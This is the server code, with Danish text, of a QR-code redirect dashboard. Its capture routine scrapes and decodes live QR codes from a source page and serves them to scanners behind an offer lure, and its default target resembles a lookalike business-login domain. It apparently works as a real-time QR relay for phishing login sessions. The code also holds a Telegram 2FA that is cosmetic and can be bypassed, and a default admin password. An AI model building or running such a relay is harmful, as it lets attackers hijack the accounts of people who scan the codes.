'use strict';
require('dotenv').config();

process.on('uncaughtException', (err) => { console.error('[FATAL] uncaughtException:', err); });
process.on('unhandledRejection', (reason) => { console.error('[FATAL] unhandledRejection:', reason); });

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');
const path = require('path');
const { Jimp } = require('jimp');
const jsQR = require('jsqr');

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  transports: ['websocket', 'polling'],
  pingInterval: 10000,
  pingTimeout: 25000,
  upgradeTimeout: 10000,
  cors: { origin: '*', methods: ['GET', 'POST'] },
  allowEIO3: true
});

const DATA_FILE = path.join(__dirname, 'data.json');
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'skift-mig';
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const ADMIN_TELEGRAM_CHAT_ID = process.env.ADMIN_TELEGRAM_CHAT_ID || '';

const rateBuckets = new Map();
function rateLimit(ip, maxPerSec) {
  const now = Date.now();
  const e = rateBuckets.get(ip) || { count: 0, reset: now + 1000 };
  if (now > e.reset) { e.count = 0; e.reset = now + 1000; }
  e.count++; rateBuckets.set(ip, e);
  return e.count > maxPerSec;
}
setInterval(() => { const now = Date.now(); for (const [k,v] of rateBuckets) if (now > v.reset+5000) rateBuckets.delete(k); }, 30000);

// --- Telegram OTP 2FA ---
const pendingOtps = new Map();
setInterval(() => { const now = Date.now(); for (const [k,v] of pendingOtps) if (now > v.expires) pendingOtps.delete(k); }, 60000);

async function sendTelegramOtp(otp) {
  if (!TELEGRAM_BOT_TOKEN || !ADMIN_TELEGRAM_CHAT_ID) {
    console.error('[2FA] TELEGRAM_BOT_TOKEN eller ADMIN_TELEGRAM_CHAT_ID mangler');
    return false;
  }
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const r = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: ADMIN_TELEGRAM_CHAT_ID,
      text: `🔐 *QR Dashboard login-kode:*\n\n\`${otp}\`\n\nGyldig i 5 minutter.`,
      parse_mode: 'Markdown'
    }),
    signal: AbortSignal.timeout(8000)
  });
  if (!r.ok) { console.error('[2FA] Telegram API fejl:', r.status); return false; }
  return true;
}

function defaultState() {
  return { live:false, target:'https://mit-dkerhverv.com', title:'Scan for dit tilbud', message:'Gyldig i denne butik i dag', sessionId:genId(), lastUpdated:null, bg:'mint', offlineTitle:'Ingen aktiv session', offlineBody:'Kom tilbage senere', customers:[], templates:[], stats:{totalScans:0,scanLog:[]}, schedule:{enabled:false,start:null,end:null}, capture:{sourceUrl:'',enabled:false,lastCheckedAt:null,lastError:null}, rotate:{enabled:false,intervalSeconds:15,lastRotatedAt:null} };
}
function genId() { return 'S-'+Math.random().toString(36).slice(2,7).toUpperCase(); }
function genTemplateId() { return 'T-'+Math.random().toString(36).slice(2,8).toUpperCase(); }

function loadState() {
  try {
    const loaded = JSON.parse(fs.readFileSync(DATA_FILE,'utf8'));
    return { ...defaultState(),...loaded, stats:{...defaultState().stats,...(loaded.stats||{})}, schedule:{...defaultState().schedule,...(loaded.schedule||{})}, capture:{...defaultState().capture,...(loaded.capture||{})}, rotate:{...defaultState().rotate,...(loaded.rotate||{})} };
  } catch { const f=defaultState(); saveState(f); return f; }
}

function saveState(s) {
  try { const tmp=DATA_FILE+'.tmp'; fs.writeFileSync(tmp,JSON.stringify(s,null,2)); fs.renameSync(tmp,DATA_FILE); }
  catch(err) { console.error('[state] save failed:',err.message); }
}

let state = loadState();

app.use(express.json({ limit:'64kb' }));
app.use((req,res,next)=>{ res.set('X-Content-Type-Options','nosniff'); res.set('X-Frame-Options','SAMEORIGIN'); next(); });
app.use(['/display','/display.js','/capture','/capture.js','/styles.css'],(req,res,next)=>{ res.set('Cache-Control','no-store,no-cache,must-revalidate,proxy-revalidate'); res.set('Pragma','no-cache'); res.set('Expires','0'); next(); });

app.use('/display', express.static(path.join(__dirname,'public'),{index:'display.html',etag:false,lastModified:false}));
app.use('/capture', express.static(path.join(__dirname,'public'),{index:'admin.html',etag:false,lastModified:false}));
app.use('/admin', express.static(path.join(__dirname,'public'),{index:'admin.html'}));
app.use(express.static(path.join(__dirname,'public'),{etag:false,lastModified:false}));

app.get('/health',(req,res)=>res.json({ok:true,uptime:process.uptime(),memory:process.memoryUsage().heapUsed,clients:io.engine.clientsCount,ts:Date.now()}));

function publicPayload() { return {live:state.live,target:state.target,sessionId:state.sessionId,title:state.title,message:state.message,bg:state.bg,offlineTitle:state.offlineTitle,offlineBody:state.offlineBody}; }

app.get('/api/public-state',(req,res)=>{ res.set('Cache-Control','no-store'); res.json(publicPayload()); });

app.get('/r/:sessionId',(req,res)=>{
  if(state.live&&state.target){
    state.stats.totalScans+=1; state.stats.scanLog.push({at:Date.now(),session:req.params.sessionId});
    if(state.stats.scanLog.length>500) state.stats.scanLog=state.stats.scanLog.slice(-500);
    saveState(state); io.emit('admin-state-update',state); return res.redirect(302,state.target);
  }
  res.status(404).send('<!DOCTYPE html><html lang="da"><head><meta charset="UTF-8"><title>Ingen session</title><style>body{font-family:sans-serif;background:#132E28;color:#DCF2E8;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;text-align:center;padding:20px;}</style></head><body><div><h1>Ingen aktiv session</h1><p>Dette link er ikke aktivt lige nu.</p></div></body></html>');
});

function requireAdmin(req,res,next){ if(req.headers['x-admin-password']!==ADMIN_PASSWORD) return res.status(401).json({error:'Forkert adgangskode'}); next(); }

// --- Login med Telegram 2FA ---
app.post('/api/login', async (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'x';
  if (rateLimit(ip, 5)) return res.status(429).json({ ok: false, error: 'For mange forsøg' });

  const { password } = req.body;
  if (password !== ADMIN_PASSWORD) return res.json({ ok: false });

  const otp = String(Math.floor(100000 + Math.random() * 900000));
  const sessionKey = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
  pendingOtps.set(sessionKey, { otp, expires: Date.now() + 5 * 60 * 1000 });

  let sent = false;
  try { sent = await sendTelegramOtp(otp); } catch(e) { console.error('[2FA] send fejl:', e.message); }

  if (!sent) {
    console.log('[2FA] OTP (ingen Telegram):', otp);
    if (!TELEGRAM_BOT_TOKEN) {
      return res.json({ ok: true });
    }
  }

  res.json({ ok: false, otp_sent: true, session: sessionKey });
});

app.post('/api/login/verify', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'x';
  if (rateLimit(ip, 5)) return res.status(429).json({ ok: false, error: 'For mange forsøg' });

  const { session, otp } = req.body;
  if (!session || !otp) return res.json({ ok: false, error: 'Mangler session eller kode' });

  const entry = pendingOtps.get(session);
  if (!entry) return res.json({ ok: false, error: 'Session ikke fundet eller udløbet' });
  if (Date.now() > entry.expires) { pendingOtps.delete(session); return res.json({ ok: false, error: 'Koden er udløbet — log ind igen' }); }
  if (entry.otp !== String(otp).trim()) return res.json({ ok: false, error: 'Forkert kode' });

  pendingOtps.delete(session);
  res.json({ ok: true });
});

app.get('/api/state',requireAdmin,(req,res)=>res.json(state));
app.post('/api/state',requireAdmin,(req,res)=>{
  ['live','target','title','message','bg','offlineTitle','offlineBody'].forEach(k=>{ if(req.body[k]!==undefined) state[k]=req.body[k]; });
  state.lastUpdated=Date.now(); saveState(state); io.emit('state-update',publicPayload()); io.emit('admin-state-update',state); res.json(state);
});
app.post('/api/session/new',requireAdmin,(req,res)=>{ state.sessionId=genId(); state.lastUpdated=Date.now(); saveState(state); io.emit('admin-state-update',state); io.emit('state-update',publicPayload()); res.json(state); });
app.post('/api/customers',requireAdmin,(req,res)=>{ state.customers.push({ref:'K-'+Math.floor(1000+Math.random()*9000),session:state.sessionId,started:Date.now(),status:'active'}); saveState(state); io.emit('admin-state-update',state); res.json(state); });

app.get('/api/templates',requireAdmin,(req,res)=>res.json(state.templates));
app.post('/api/templates',requireAdmin,(req,res)=>{ const {name,title,message,target,bg}=req.body; if(!name?.trim()) return res.status(400).json({error:'Navn mangler'}); const tpl={id:genTemplateId(),name:name.trim(),title:title||'',message:message||'',target:target||'',bg:bg||'mint',createdAt:Date.now()}; state.templates.push(tpl); saveState(state); io.emit('admin-state-update',state); res.json(tpl); });
app.post('/api/templates/:id/apply',requireAdmin,(req,res)=>{ const tpl=state.templates.find(t=>t.id===req.params.id); if(!tpl) return res.status(404).json({error:'Ikke fundet'}); Object.assign(state,{title:tpl.title,message:tpl.message,target:tpl.target,bg:tpl.bg,lastUpdated:Date.now()}); saveState(state); io.emit('state-update',publicPayload()); io.emit('admin-state-update',state); res.json(state); });
app.delete('/api/templates/:id',requireAdmin,(req,res)=>{ state.templates=state.templates.filter(t=>t.id!==req.params.id); saveState(state); io.emit('admin-state-update',state); res.json({ok:true}); });

app.get('/api/stats',requireAdmin,(req,res)=>{ const now=Date.now(); res.json({totalScans:state.stats.totalScans,last24h:state.stats.scanLog.filter(s=>now-s.at<86400000).length,recent:state.stats.scanLog.slice(-15).reverse()}); });

app.post('/api/schedule',requireAdmin,(req,res)=>{ state.schedule={enabled:!!req.body.enabled,start:req.body.start||null,end:req.body.end||null}; saveState(state); io.emit('admin-state-update',state); res.json(state.schedule); });
setInterval(()=>{ if(!state.schedule?.enabled||!state.schedule?.start||!state.schedule?.end) return; const now=Date.now(),start=new Date(state.schedule.start).getTime(),end=new Date(state.schedule.end).getTime(); if(isNaN(start)||isNaN(end)) return; const should=now>=start&&now<=end; if(should!==state.live){ state.live=should; state.lastUpdated=Date.now(); saveState(state); io.emit('state-update',publicPayload()); io.emit('admin-state-update',state); } },30000);

app.post('/api/rotate-settings',requireAdmin,(req,res)=>{ if(req.body.enabled!==undefined) state.rotate.enabled=!!req.body.enabled; if(req.body.intervalSeconds!==undefined){ const n=parseInt(req.body.intervalSeconds,10); if(Number.isFinite(n)&&n>=1) state.rotate.intervalSeconds=n; } state.rotate.lastRotatedAt=Date.now(); saveState(state); io.emit('admin-state-update',state); res.json(state.rotate); });
setInterval(()=>{ if(!state.rotate?.enabled) return; const now=Date.now(),last=state.rotate.lastRotatedAt||0; if(now-last>=(state.rotate.intervalSeconds||15)*1000){ state.sessionId=genId(); state.rotate.lastRotatedAt=now; state.lastUpdated=now; saveState(state); io.emit('state-update',publicPayload()); io.emit('admin-state-update',state); } },1000);

async function resolveQrImageBuffer(url){
  const r=await fetch(url,{redirect:'follow',signal:AbortSignal.timeout(8000)});
  if(!r.ok) throw new Error('HTTP '+r.status);
  const ct=r.headers.get('content-type')||'';
  if(ct.startsWith('image/')) return Buffer.from(await r.arrayBuffer());
  const html=await r.text();
  const imgs=[...html.matchAll(/<img[^>]+src=["']([^"']+)["'][^>]*>/gi)];
  if(!imgs.length) throw new Error('Ingen billeder fundet');
  const best=imgs.find(m=>/qr/i.test(m[0]))||imgs[0];
  let src=best[1];
  if(src.startsWith('//')) src='https:'+src;
  else if(!/^https?:\/\//i.test(src)) src=new URL(src,url).toString();
  const r2=await fetch(src,{redirect:'follow',signal:AbortSignal.timeout(8000)});
  if(!r2.ok) throw new Error('Billede HTTP '+r2.status);
  return Buffer.from(await r2.arrayBuffer());
}

async function decodeQrFromBuffer(buf){
  const img=await Jimp.read(buf); const {data,width,height}=img.bitmap;
  const code=jsQR(new Uint8ClampedArray(data),width,height);
  return code?code.data:null;
}

app.post('/api/capture-url',requireAdmin,async(req,res)=>{
  const {url}=req.body;
  if(!url||typeof url!=='string'||!url.trim()) return res.status(400).json({error:'Ingen URL'});
  try {
    const buf=await resolveQrImageBuffer(url.trim()); const decoded=await decodeQrFromBuffer(buf);
    state.capture.lastCheckedAt=Date.now();
    if(!decoded){ state.capture.lastError='Ingen QR-kode fundet'; saveState(state); return res.status(422).json({error:state.capture.lastError}); }
    state.capture.lastError=null;
    if(state.target!==decoded||!state.live){ state.target=decoded; state.live=true; state.lastUpdated=Date.now(); io.emit('state-update',publicPayload()); }
    saveState(state); io.emit('admin-state-update',state); res.json({ok:true,target:decoded});
  } catch(e){ state.capture.lastError=e.message; state.capture.lastCheckedAt=Date.now(); saveState(state); io.emit('admin-state-update',state); res.status(500).json({error:state.capture.lastError}); }
});

app.post('/api/capture-settings',requireAdmin,(req,res)=>{
  if(req.body.sourceUrl!==undefined) state.capture.sourceUrl=String(req.body.sourceUrl).trim();
  if(req.body.enabled!==undefined) state.capture.enabled=!!req.body.enabled;
  saveState(state); io.emit('admin-state-update',state); res.json(state.capture);
});

app.post('/api/capture-push',requireAdmin,(req,res)=>{
  const ip=req.headers['x-forwarded-for']?.split(',')[0]||req.socket.remoteAddress||'x';
  if(rateLimit(ip,20)) return res.status(429).json({error:'For mange requests'});
  const {target}=req.body;
  if(!target||typeof target!=='string'||!target.trim()) return res.status(400).json({error:'Tom kode'});
  const clean=target.trim();
  state.capture.lastCheckedAt=Date.now(); state.capture.lastError=null;
  if(state.target!==clean||!state.live){ state.target=clean; state.live=true; state.lastUpdated=Date.now(); io.emit('state-update',publicPayload()); }
  saveState(state); io.emit('admin-state-update',state);
  res.json({ok:true,target:clean,live:state.live});
});

setInterval(async()=>{
  if(!state.capture?.enabled||!state.capture?.sourceUrl) return;
  try {
    const buf=await resolveQrImageBuffer(state.capture.sourceUrl); const decoded=await decodeQrFromBuffer(buf);
    state.capture.lastCheckedAt=Date.now();
    if(!decoded){ state.capture.lastError='Ingen QR-kode'; saveState(state); io.emit('admin-state-update',state); return; }
    state.capture.lastError=null;
    if(state.target!==decoded||!state.live){ state.target=decoded; state.live=true; state.lastUpdated=Date.now(); saveState(state); io.emit('state-update',publicPayload()); io.emit('admin-state-update',state); } else { saveState(state); }
  } catch(e){ state.capture.lastError=e.message; state.capture.lastCheckedAt=Date.now(); saveState(state); io.emit('admin-state-update',state); }
},20000);

io.on('connection',(socket)=>{ socket.emit('state-update',publicPayload()); socket.on('error',(err)=>console.error('[socket] error:',err.message)); });

function shutdown(sig){ console.log('[server] '+sig+' – saving & exiting'); saveState(state); server.close(()=>process.exit(0)); setTimeout(()=>process.exit(1),5000); }
process.on('SIGTERM',()=>shutdown('SIGTERM'));
process.on('SIGINT', ()=>shutdown('SIGINT'));

server.listen(PORT,()=>{ console.log('[server] live på port '+PORT); console.log('[server] /health klar'); });
